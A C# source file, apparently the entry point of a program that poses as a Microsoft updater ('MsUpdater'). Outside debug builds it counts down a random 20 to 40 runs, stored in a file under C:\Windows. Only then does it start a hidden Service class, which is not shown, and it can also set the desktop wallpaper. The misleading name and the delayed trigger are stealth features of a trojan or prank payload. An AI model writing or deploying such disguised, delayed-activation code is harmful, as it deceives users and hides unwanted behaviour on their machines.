namespace MsUpdater
{
    using System;
    using System.Diagnostics;
    using System.IO;
#if !DEBUG
    using System.Linq;
#endif
    using System.Runtime.CompilerServices;
    using System.Threading;

    internal static class Program
    {
        private static void Main(string[] args)
        {
            if (args == null)
            {
                throw new ArgumentNullException(nameof(args));
            }

            Thread.Sleep(200);

#if !DEBUG
            const string target = @"C:\Windows\MsUpdater\triggerCount";

            if (!File.Exists(target))
            {
                File.WriteAllText(target, new Random().Next(20, 40).ToString());
                return;
            }

            var reboots = int.Parse(File.ReadAllLines(target).Single());

            if (reboots != 0)
            {
                File.WriteAllText(target, (reboots - 1).ToString());
                return;
            }
#endif

            RuntimeHelpers.RunClassConstructor(typeof(Service).TypeHandle);

            Process.GetCurrentProcess().WaitForExit();
        }

        internal static void SetWallpaper(string wallpaper)
        {
            File.WriteAllText(@"C:\Windows\MsUpdater\wallpaper", wallpaper);
        }
    }
}